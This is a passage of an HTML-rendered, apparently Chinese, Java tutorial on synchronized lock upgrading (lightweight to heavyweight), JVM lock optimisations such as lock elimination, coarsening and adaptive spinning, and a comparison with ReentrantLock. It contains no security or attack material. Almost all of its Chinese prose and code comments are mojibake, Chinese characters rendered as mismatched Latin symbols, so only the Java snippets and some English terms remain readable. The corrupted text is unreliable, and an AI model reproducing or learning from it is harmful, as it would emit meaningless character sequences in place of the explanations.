    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¤šçº¿ç¨‹ç«äº‰ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
        <span class="hljs-comment">// ä½¿ç”¨è½»é‡çº§é”ï¼šCAS + è‡ªæ—‹</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šå¤šä¸ªçº¿ç¨‹ï¼Œä½†ç«äº‰ä¸æ¿€çƒˆ</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹åŒæ—¶è°ƒç”¨ï¼Œä½†å¤§å¤šæ•°æƒ…å†µä¸‹CASèƒ½æˆåŠŸ</span>
<span class="hljs-comment">// åªæœ‰å°‘æ•°æƒ…å†µéœ€è¦è‡ªæ—‹é‡è¯•</span>
</code></pre>
<p><strong>è½»é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>ä½¿ç”¨CAS</strong>ï¼šæ— é”ç¼–ç¨‹æ€æƒ³ï¼Œæ€§èƒ½å¥½</li>
<li>âœ… <strong>è‡ªæ—‹é‡è¯•</strong>ï¼šå¤±è´¥åè‡ªæ—‹å‡ æ¬¡ï¼Œé¿å…ç«‹å³é˜»å¡</li>
<li>âš ï¸ <strong>CPUæ¶ˆè€—</strong>ï¼šè‡ªæ—‹ä¼šå ç”¨CPUï¼Œä¸é€‚åˆé«˜ç«äº‰åœºæ™¯</li>
<li>âš ï¸ <strong>å¯èƒ½å‡çº§</strong>ï¼šè‡ªæ—‹å¤±è´¥åå‡çº§ä¸ºé‡é‡çº§é”</li>
</ul>
<h5 data-id="heading-67">é‡é‡çº§é”ï¼ˆHeavyweight Lockingï¼‰</h5>
<p><strong>è®¾è®¡ç›®çš„ï¼š</strong> å½“ç«äº‰æ¿€çƒˆæ—¶ï¼Œä½¿ç”¨æ“ä½œç³»ç»Ÿçº§åˆ«çš„äº’æ–¥é‡ï¼Œè®©çº¿ç¨‹é˜»å¡ç­‰å¾…</p>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>é”ç«äº‰æ¿€çƒˆï¼ˆå¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰ï¼‰</li>
<li>è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆè‡ªæ—‹æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼‰</li>
<li>ç­‰å¾…æ—¶é—´å¯èƒ½å¾ˆé•¿</li>
</ul>
<p><strong>å·¥ä½œåŸç†ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<p><strong>å‡çº§è¿‡ç¨‹ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> è½»é‡çº§é”è‡ªæ—‹å¤±è´¥ï¼ˆå¤šæ¬¡CASå¤±è´¥ï¼‰
<span class="hljs-bullet">2.</span> é”å‡çº§ä¸ºé‡é‡çº§é”
<span class="hljs-bullet">3.</span> å¯¹è±¡å¤´çš„Mark WordæŒ‡å‘monitorå¯¹è±¡ï¼ˆç®¡ç¨‹ï¼‰
<span class="hljs-bullet">4.</span> ç«äº‰å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—
<span class="hljs-bullet">5.</span> ç”±æ“ä½œç³»ç»Ÿè¿›è¡Œçº¿ç¨‹è°ƒåº¦å’Œå”¤é†’
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆå«"é‡é‡çº§"ï¼Ÿ</strong></p>
<ul>
<li>éœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼ˆæ“ä½œç³»ç»Ÿçº§åˆ«çš„mutexï¼‰</li>
<li>çº¿ç¨‹ä¼šé˜»å¡ï¼Œéœ€è¦ä¸Šä¸‹æ–‡åˆ‡æ¢</li>
<li>å¼€é”€æ¯”è½»é‡çº§é”å¤§</li>
</ul>
<p><strong>ä»£ç ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Counter</span> {
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">increment</span><span class="hljs-params">()</span> {
        <span class="hljs-comment">// å¾ˆå¤šçº¿ç¨‹åŒæ—¶ç«äº‰</span>
        <span class="hljs-comment">// ä½¿ç”¨é‡é‡çº§é”ï¼šçº¿ç¨‹é˜»å¡ç­‰å¾…</span>
        count++;
    }
}

<span class="hljs-comment">// åœºæ™¯ï¼šé«˜ç«äº‰</span>
<span class="hljs-type">Counter</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Counter</span>();
<span class="hljs-comment">// 100ä¸ªçº¿ç¨‹åŒæ—¶ç«äº‰ï¼Œè½»é‡çº§é”è‡ªæ—‹å¤±è´¥</span>
<span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”ï¼Œå¤§éƒ¨åˆ†çº¿ç¨‹é˜»å¡ç­‰å¾…</span>
</code></pre>
<p><strong>é‡é‡çº§é”çš„ç‰¹ç‚¹ï¼š</strong></p>
<ul>
<li>âœ… <strong>é€‚åˆé«˜ç«äº‰</strong>ï¼šç«äº‰æ¿€çƒˆæ—¶æ€§èƒ½ç¨³å®š</li>
<li>âœ… <strong>èŠ‚çœCPU</strong>ï¼šé˜»å¡çš„çº¿ç¨‹ä¸å ç”¨CPU</li>
<li>âŒ <strong>å¼€é”€å¤§</strong>ï¼šéœ€è¦æ“ä½œç³»ç»Ÿä»‹å…¥ï¼Œä¸Šä¸‹æ–‡åˆ‡æ¢å¼€é”€</li>
<li>âŒ <strong>å“åº”æ…¢</strong>ï¼šçº¿ç¨‹é˜»å¡åéœ€è¦ç­‰å¾…è¢«å”¤é†’</li>
</ul>
<h4 data-id="heading-68">é”å‡çº§çš„æ¡ä»¶å’Œæ—¶æœº</h4>
<p><strong>å‡çº§è·¯å¾„ï¼ˆå•å‘ï¼Œä¸èƒ½é™çº§ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">æ— é” â†’ åå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”
<span class="hljs-code">      ï¼ˆä¸€æ—¦å‡çº§ï¼Œä¸èƒ½é™çº§ï¼‰
</span></code></pre>
<p><strong>å‡çº§æ¡ä»¶è¯¦è§£ï¼š</strong></p>
<h5 data-id="heading-69">1. æ— é” â†’ åå‘é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>å¯¹è±¡è¢«ç¬¬ä¸€ä¸ªçº¿ç¨‹è®¿é—®åŒæ­¥ä»£ç å—</li>
<li>JVMå¯ç”¨åå‘é”ï¼ˆJDK 15+é»˜è®¤ç¦ç”¨ï¼Œä½†äº†è§£åŸç†å¾ˆé‡è¦ï¼‰</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();  <span class="hljs-comment">// æ— é”çŠ¶æ€</span>

<span class="hljs-comment">// ç¬¬ä¸€æ¬¡è®¿é—®</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºåå‘é”ï¼Œè®°å½•å½“å‰çº¿ç¨‹ID</span>
}
</code></pre>
<h5 data-id="heading-70">2. åå‘é” â†’ è½»é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>æœ‰å…¶ä»–çº¿ç¨‹å°è¯•è·å–åå‘é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</li>
<li>åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// çº¿ç¨‹1è·å¾—åå‘é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// åå‘é”çŠ¶æ€</span>
}

<span class="hljs-comment">// çº¿ç¨‹2å°è¯•è·å–é”ï¼ˆå‘ç°çº¿ç¨‹IDä¸æ˜¯è‡ªå·±ï¼‰</span>
<span class="hljs-comment">// è§¦å‘åå‘é”æ’¤é”€ï¼Œå‡çº§ä¸ºè½»é‡çº§é”</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// è½»é‡çº§é”çŠ¶æ€ï¼Œä½¿ç”¨CASç«äº‰</span>
}
</code></pre>
<h5 data-id="heading-71">3. è½»é‡çº§é” â†’ é‡é‡çº§é”</h5>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>è‡ªæ—‹å¤±è´¥ï¼ˆCASå¤±è´¥æ¬¡æ•°è¶…è¿‡é˜ˆå€¼ï¼Œå¦‚10æ¬¡ï¼‰</li>
<li>ç­‰å¾…çš„çº¿ç¨‹æ•°è¶…è¿‡1ä¸ª</li>
<li>è‡ªæ—‹æ—¶é—´è¿‡é•¿</li>
</ul>
<p><strong>æ—¶æœºï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// å¤šä¸ªçº¿ç¨‹ç«äº‰ï¼ŒCASé¢‘ç¹å¤±è´¥</span>
<span class="hljs-comment">// è‡ªæ—‹å¤šæ¬¡åä»ç„¶å¤±è´¥</span>
<span class="hljs-keyword">synchronized</span>(obj) {
    <span class="hljs-comment">// å‡çº§ä¸ºé‡é‡çº§é”</span>
    <span class="hljs-comment">// å¤±è´¥çš„çº¿ç¨‹è¿›å…¥é˜»å¡é˜Ÿåˆ—</span>
}
</code></pre>
<p><strong>å‡çº§å†³ç­–æµç¨‹ï¼ˆç®€åŒ–ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown">çº¿ç¨‹å°è¯•è·å–é”
  â†“
æ˜¯å¦æœ‰ç«äº‰ï¼Ÿ
  â”œâ”€ æ—  â†’ åå‘é”ï¼ˆè®°å½•çº¿ç¨‹IDï¼‰
  â””â”€ æœ‰ â†’ è½»é‡çº§é”ï¼ˆCAS + è‡ªæ—‹ï¼‰
<span class="hljs-code">       â†“
     è‡ªæ—‹æ˜¯å¦æˆåŠŸï¼Ÿ
       â”œâ”€ æˆåŠŸ â†’ ä¿æŒè½»é‡çº§é”
       â””â”€ å¤±è´¥ï¼ˆè¶…è¿‡é˜ˆå€¼ï¼‰â†’ é‡é‡çº§é”ï¼ˆé˜»å¡ç­‰å¾…ï¼‰
</span></code></pre>
<p><strong>æŸ¥çœ‹é”çŠ¶æ€ï¼ˆäº†è§£å³å¯ï¼‰ï¼š</strong></p>
<p>å¯ä»¥ä½¿ç”¨JOLï¼ˆJava Object Layoutï¼‰å·¥å…·æŸ¥çœ‹å¯¹è±¡å¤´çš„é”çŠ¶æ€ï¼š</p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// éœ€è¦æ·»åŠ ä¾èµ–ï¼šorg.openjdk.jol:jol-core</span>
<span class="hljs-keyword">import</span> org.openjdk.jol.info.ClassLayout;

<span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();
System.out.println(ClassLayout.parseInstance(obj).toPrintable());
<span class="hljs-comment">// å¯ä»¥çœ‹åˆ°Mark Wordçš„è¯¦ç»†ä¿¡æ¯ï¼ŒåŒ…æ‹¬é”çŠ¶æ€</span>
</code></pre>
<h3 data-id="heading-72">3.3 synchronizedçš„ä¼˜åŒ–</h3>
<p><strong>JVMä¼šå¯¹synchronizedè¿›è¡Œå¤šç§ä¼˜åŒ–ï¼Œæé«˜æ€§èƒ½ã€‚</strong></p>
<h4 data-id="heading-73">é”æ¶ˆé™¤ï¼ˆLock Eliminationï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> JVMåœ¨JITç¼–è¯‘æ—¶ï¼Œåˆ†æä»£ç åå‘ç°æŸä¸ªé”æ²¡æœ‰å¿…è¦ï¼Œå°±è‡ªåŠ¨æ¶ˆé™¤å®ƒã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆä¼šæ¶ˆé™¤ï¼Ÿ</strong></p>
<ul>
<li>å¦‚æœå¯¹è±¡ä¸ä¼š"é€ƒé€¸"å‡ºæ–¹æ³•ï¼ˆå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°ï¼‰</li>
<li>å°±æ²¡æœ‰å¤šçº¿ç¨‹ç«äº‰ï¼Œé”å°±æ²¡æœ‰å¿…è¦</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// StringBufferæ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼ˆå†…éƒ¨æœ‰synchronizedï¼‰</span>
<span class="hljs-keyword">public</span> String <span class="hljs-title function_">concatString</span><span class="hljs-params">(String s1, String s2, String s3)</span> {
    <span class="hljs-type">StringBuffer</span> <span class="hljs-variable">sb</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">StringBuffer</span>();  <span class="hljs-comment">// å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸</span>
    sb.append(s1);  <span class="hljs-comment">// è¿™äº›æ“ä½œè™½ç„¶æœ‰é”ï¼Œä½†JVMä¼šæ¶ˆé™¤</span>
    sb.append(s2);
    sb.append(s3);
    <span class="hljs-keyword">return</span> sb.toString();
}

<span class="hljs-comment">// JVMåˆ†æåå‘ç°ï¼šsbæ˜¯å±€éƒ¨å˜é‡ï¼Œå…¶ä»–çº¿ç¨‹è®¿é—®ä¸åˆ°</span>
<span class="hljs-comment">// ä¼˜åŒ–ï¼šæ¶ˆé™¤StringBufferå†…éƒ¨çš„é”ï¼Œç›´æ¥æ“ä½œï¼ˆæ›´å¿«ï¼‰</span>
</code></pre>
<p><strong>è§¦å‘æ¡ä»¶ï¼š</strong></p>
<ul>
<li>âœ… å¯¹è±¡æ˜¯å±€éƒ¨å˜é‡ï¼Œä¸ä¼šé€ƒé€¸å‡ºæ–¹æ³•</li>
<li>âœ… æ²¡æœ‰å…¶ä»–çº¿ç¨‹èƒ½è®¿é—®åˆ°è¿™ä¸ªå¯¹è±¡</li>
<li>âœ… JVMåœ¨JITç¼–è¯‘æ—¶æ£€æµ‹åˆ°</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> æ¶ˆé™¤ä¸å¿…è¦çš„é”å¼€é”€ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-74">é”ç²—åŒ–ï¼ˆLock Coarseningï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> å°†å¤šä¸ªè¿ç»­çš„åŠ é”ã€è§£é”æ“ä½œåˆå¹¶æˆä¸€ä¸ªæ›´å¤§çš„é”ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦ç²—åŒ–ï¼Ÿ</strong></p>
<ul>
<li>é¢‘ç¹åŠ é”è§£é”æœ‰å¼€é”€</li>
<li>å¦‚æœè¿ç»­çš„åŒæ­¥å—ä½¿ç”¨åŒä¸€ä¸ªé”ï¼Œå¯ä»¥åˆå¹¶</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-comment">// âŒ åŸå§‹ä»£ç ï¼šå¤šä¸ªè¿ç»­çš„åŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
    }
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}

<span class="hljs-comment">// âœ… JVMä¼˜åŒ–åï¼šåˆå¹¶ä¸ºä¸€ä¸ªåŒæ­¥å—</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(<span class="hljs-built_in">this</span>) {
        count1++;  <span class="hljs-comment">// æ“ä½œ1</span>
        count2++;  <span class="hljs-comment">// æ“ä½œ2</span>
        count3++;  <span class="hljs-comment">// æ“ä½œ3</span>
    }
}
</code></pre>
<p><strong>é€‚ç”¨åœºæ™¯ï¼š</strong></p>
<ul>
<li>âœ… å¾ªç¯ä¸­çš„åŒæ­¥æ“ä½œ</li>
<li>âœ… è¿ç»­çš„åŒæ­¥å—ï¼ˆä½¿ç”¨åŒä¸€ä¸ªé”ï¼‰</li>
<li>âœ… é”çš„ç²’åº¦å¯ä»¥é€‚å½“å¢å¤§è€Œä¸å½±å“æ€§èƒ½</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å‡å°‘åŠ é”è§£é”çš„æ¬¡æ•°ï¼Œæé«˜æ€§èƒ½</p>
<h4 data-id="heading-75">è‡ªé€‚åº”è‡ªæ—‹ï¼ˆAdaptive Spinningï¼‰</h4>
<p><strong>åŸç†ï¼š</strong> è‡ªæ—‹æ¬¡æ•°ä¸å†å›ºå®šï¼Œè€Œæ˜¯æ ¹æ®å†å²æƒ…å†µåŠ¨æ€è°ƒæ•´ã€‚</p>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦è‡ªé€‚åº”ï¼Ÿ</strong></p>
<ul>
<li>å›ºå®šè‡ªæ—‹æ¬¡æ•°å¯èƒ½æµªè´¹CPUï¼ˆå¤ªå¤šæ¬¡ï¼‰</li>
<li>ä¹Ÿå¯èƒ½é”™è¿‡æœºä¼šï¼ˆå¤ªå°‘äº†ï¼‰</li>
</ul>
<p><strong>è‡ªé€‚åº”ç­–ç•¥ï¼š</strong></p>
<pre><code class="hljs">å¦‚æœä¹‹å‰è‡ªæ—‹æˆåŠŸè¿‡ï¼š
  â†’ å¢åŠ è‡ªæ—‹æ¬¡æ•°ï¼ˆå¯èƒ½å¾ˆå¿«å°±èƒ½è·å¾—é”ï¼‰

å¦‚æœä¹‹å‰è‡ªæ—‹å¾ˆå°‘æˆåŠŸï¼š
  â†’ å‡å°‘è‡ªæ—‹æ¬¡æ•°ï¼ˆå‡å°‘CPUæµªè´¹ï¼‰
  â†’ ç”šè‡³ç›´æ¥é˜»å¡ï¼ˆä¸æµªè´¹æ—¶é—´è‡ªæ—‹ï¼‰
</code></pre>
<p><strong>ç®€å•ç†è§£ï¼š</strong></p>
<ul>
<li>JVMä¼š"å­¦ä¹ "è¿™ä¸ªé”çš„ç‰¹æ€§</li>
<li>æ ¹æ®å†å²æˆåŠŸç‡è°ƒæ•´ç­–ç•¥</li>
<li>æ™ºèƒ½ä¼˜åŒ–ï¼Œæé«˜æ•ˆç‡</li>
</ul>
<p><strong>æ•ˆæœï¼š</strong> å¹³è¡¡CPUæ¶ˆè€—å’Œæ€§èƒ½ï¼Œæ™ºèƒ½ä¼˜åŒ–</p>
<h4 data-id="heading-76">åå‘é”çš„æ’¤é”€</h4>
<p><strong>ä»€ä¹ˆæ—¶å€™æ’¤é”€åå‘é”ï¼Ÿ</strong></p>
<p><strong>æ’¤é”€åœºæ™¯ï¼š</strong></p>
<ol>
<li><strong>æœ‰å…¶ä»–çº¿ç¨‹ç«äº‰</strong>ï¼šå‘ç°çº¿ç¨‹IDä¸æ˜¯å½“å‰çº¿ç¨‹</li>
<li><strong>è°ƒç”¨hashCode()</strong>ï¼šåå‘é”çš„Mark Wordæ²¡æœ‰ç©ºé—´å­˜å‚¨hashCode</li>
<li><strong>è°ƒç”¨wait()/notify()</strong>ï¼šè¿™äº›æ–¹æ³•éœ€è¦é‡é‡çº§é”ï¼ˆmonitorï¼‰</li>
</ol>
<p><strong>æ’¤é”€è¿‡ç¨‹ï¼ˆç®€å•ç†è§£ï¼‰ï¼š</strong></p>
<pre><code class="hljs language-markdown" lang="markdown"><span class="hljs-bullet">1.</span> æš‚åœæ‹¥æœ‰åå‘é”çš„çº¿ç¨‹ï¼ˆå®‰å…¨ç‚¹ï¼‰
<span class="hljs-bullet">2.</span> æ£€æŸ¥çº¿ç¨‹çŠ¶æ€ï¼š
   â”œâ”€ è¿˜åœ¨æ‰§è¡ŒåŒæ­¥ä»£ç å— â†’ å‡çº§ä¸ºè½»é‡çº§é”
   â””â”€ å·²ç»ç¦»å¼€åŒæ­¥ä»£ç å— â†’ æ¢å¤åˆ°æ— é”çŠ¶æ€
<span class="hljs-bullet">3.</span> å”¤é†’æš‚åœçš„çº¿ç¨‹
</code></pre>
<p><strong>ä¸ºä»€ä¹ˆéœ€è¦å®‰å…¨ç‚¹ï¼Ÿ</strong></p>
<ul>
<li>æ’¤é”€æ—¶éœ€è¦ä¿®æ”¹Mark Word</li>
<li>å¿…é¡»åœ¨çº¿ç¨‹å®‰å…¨ç‚¹è¿›è¡Œï¼ˆçº¿ç¨‹æš‚åœçŠ¶æ€ï¼‰</li>
<li>ç¡®ä¿æ“ä½œçš„åŸå­æ€§</li>
</ul>
<h3 data-id="heading-77">3.4 synchronizedçš„å±€é™æ€§</h3>
<p><strong>è™½ç„¶synchronizedå¾ˆå¼ºå¤§ï¼Œä½†ä¹Ÿæœ‰ä¸€äº›é™åˆ¶ã€‚</strong></p>
<h4 data-id="heading-78">ä¸å¯ä¸­æ–­</h4>
<p><strong>é—®é¢˜ï¼š</strong> çº¿ç¨‹åœ¨ç­‰å¾…synchronizedé”æ—¶ï¼Œæ— æ³•å“åº”ä¸­æ–­</p>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹1ï¼šæŒæœ‰é”ï¼Œæ‰§è¡Œå¾ˆé•¿æ—¶é—´</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method1</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-keyword">try</span> {
            Thread.sleep(<span class="hljs-number">10000</span>);  <span class="hljs-comment">// æŒæœ‰é”10ç§’</span>
        } <span class="hljs-keyword">catch</span> (InterruptedException e) {
            <span class="hljs-comment">// å³ä½¿è¢«ä¸­æ–­ï¼Œä¹Ÿä¼šç»§ç»­æŒæœ‰é”</span>
        }
    }
}

<span class="hljs-comment">// çº¿ç¨‹2ï¼šç­‰å¾…è·å–é”</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">method2</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ é—®é¢˜ï¼šæ— æ³•ä¸­æ–­è¿™ä¸ªç­‰å¾…</span>
    <span class="hljs-comment">// å³ä½¿è°ƒç”¨thread.interrupt()ï¼Œçº¿ç¨‹2ä¹Ÿä¸ä¼šå“åº”</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// å¿…é¡»ç­‰å¾…method1é‡Šæ”¾é”</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>çº¿ç¨‹2åœ¨ç­‰å¾…é”æ—¶ï¼Œå¦‚æœè°ƒç”¨<code>thread2.interrupt()</code>ï¼Œçº¿ç¨‹2ä¸ä¼šå“åº”</li>
<li>å¿…é¡»ç­‰åˆ°çº¿ç¨‹1é‡Šæ”¾é”ï¼Œçº¿ç¨‹2æ‰èƒ½ç»§ç»­</li>
<li>å¯èƒ½å¯¼è‡´çº¿ç¨‹ä¸€ç›´ç­‰å¾…</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock.lockInterruptibly()</code>ï¼Œå¯ä»¥å“åº”ä¸­æ–­</p>
<h4 data-id="heading-79">éå…¬å¹³é”</h4>
<p><strong>é—®é¢˜ï¼š</strong> synchronizedæ˜¯éå…¬å¹³çš„ï¼Œå¯èƒ½å¯¼è‡´çº¿ç¨‹é¥¥é¥¿</p>
<p><strong>ä»€ä¹ˆæ˜¯éå…¬å¹³ï¼Ÿ</strong></p>
<ul>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½"æ’é˜Ÿ"</li>
<li>æ¯”ç­‰å¾…é˜Ÿåˆ—ä¸­çš„çº¿ç¨‹å…ˆè·å¾—é”</li>
</ul>
<p><strong>ç¤ºä¾‹ï¼š</strong></p>
<pre><code class="hljs language-java" lang="java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">final</span> <span class="hljs-type">Object</span> <span class="hljs-variable">lock</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>();

<span class="hljs-comment">// çº¿ç¨‹Aï¼šç­‰å¾…é”ï¼ˆåœ¨é˜Ÿåˆ—ä¸­ï¼‰</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodA</span><span class="hljs-params">()</span> {
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// çº¿ç¨‹Aåœ¨é˜Ÿåˆ—ä¸­ç­‰å¾…äº†å¾ˆä¹…</span>
    }
}

<span class="hljs-comment">// çº¿ç¨‹Bï¼šæ–°æ¥çš„çº¿ç¨‹</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">methodB</span><span class="hljs-params">()</span> {
    <span class="hljs-comment">// âš ï¸ çº¿ç¨‹Bå¯èƒ½æ¯”çº¿ç¨‹Aå…ˆè·å¾—é”ï¼ˆéå…¬å¹³ï¼‰</span>
    <span class="hljs-keyword">synchronized</span>(lock) {
        <span class="hljs-comment">// æ–°çº¿ç¨‹å¯èƒ½æ’é˜ŸæˆåŠŸ</span>
    }
}
</code></pre>
<p><strong>é—®é¢˜åˆ†æï¼š</strong></p>
<ul>
<li>ç­‰å¾…æ—¶é—´é•¿çš„çº¿ç¨‹å¯èƒ½ä¸€ç›´è·å–ä¸åˆ°é”</li>
<li>æ–°æ¥çš„çº¿ç¨‹å¯èƒ½ä¸æ–­æ’é˜Ÿ</li>
<li>å¯¼è‡´æŸäº›çº¿ç¨‹"é¥¥é¥¿"ï¼ˆä¸€ç›´ç­‰å¾…ï¼‰</li>
</ul>
<p><strong>è§£å†³æ–¹æ¡ˆï¼š</strong> ä½¿ç”¨<code>ReentrantLock(true)</code>åˆ›å»ºå…¬å¹³é”</p>
<h4 data-id="heading-80">æ€§èƒ½é—®é¢˜</h4>
<p><strong>å†å²æ¼”è¿›ï¼š</strong></p>
<p><strong>JDK 1.6ä¹‹å‰ï¼š</strong></p>
<ul>
<li>synchronizedæ˜¯é‡é‡çº§é”</li>
<li>æ¯æ¬¡åŠ é”éƒ½éœ€è¦æ“ä½œç³»ç»Ÿå‚ä¸</li>
<li>æ€§èƒ½è¾ƒå·®</li>
</ul>
<p><strong>JDK 1.6ä¹‹åï¼š</strong></p>
<ul>
<li>âœ… å¼•å…¥äº†é”å‡çº§æœºåˆ¶ï¼ˆåå‘é” â†’ è½»é‡çº§é” â†’ é‡é‡çº§é”ï¼‰</li>
<li>âœ… æ€§èƒ½å¤§å¹…æå‡</li>
<li>âœ… åœ¨ä½ç«äº‰æƒ…å†µä¸‹ï¼Œæ€§èƒ½æ¥è¿‘æ— é”</li>
</ul>
<p><strong>æ€§èƒ½å¯¹æ¯”ï¼š</strong></p>






























<table><thead><tr><th>åœºæ™¯</th><th>synchronized</th><th>ReentrantLock</th></tr></thead><tbody><tr><td><strong>ä½ç«äº‰</strong></td><td>âœ… æ€§èƒ½å¾ˆå¥½ï¼ˆé”å‡çº§ä¼˜åŒ–ï¼‰</td><td>âœ… æ€§èƒ½ä¹Ÿå¾ˆå¥½</td></tr><tr><td><strong>é«˜ç«äº‰</strong></td><td>âš ï¸ å¯èƒ½å‡çº§ä¸ºé‡é‡çº§é”</td><td>âœ… æ€§èƒ½å¯èƒ½æ›´å¥½</td></tr><tr><td><strong>å¯ä¸­æ–­</strong></td><td>âŒ ä¸æ”¯æŒ</td><td>âœ… æ”¯æŒ</td></tr><tr><td><strong>å…¬å¹³é”</strong></td><td>âŒ éå…¬å¹³</td><td>âœ… å¯é€‰å…¬å¹³/éå…¬å¹³</td></tr></tbody></table>
<p><strong>å»ºè®®ï¼š</strong></p>
<ul>
<li>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œsynchronizedæ€§èƒ½å·²ç»å¾ˆå¥½</li>
<li>éœ€è¦å¯ä¸­æ–­æˆ–å…¬å¹³é”æ—¶ï¼Œä½¿ç”¨ReentrantLock</li>
<li>ä½ç«äº‰åœºæ™¯ï¼šä¸¤è€…æ€§èƒ½æ¥è¿‘</li>
</ul>
<hr/>
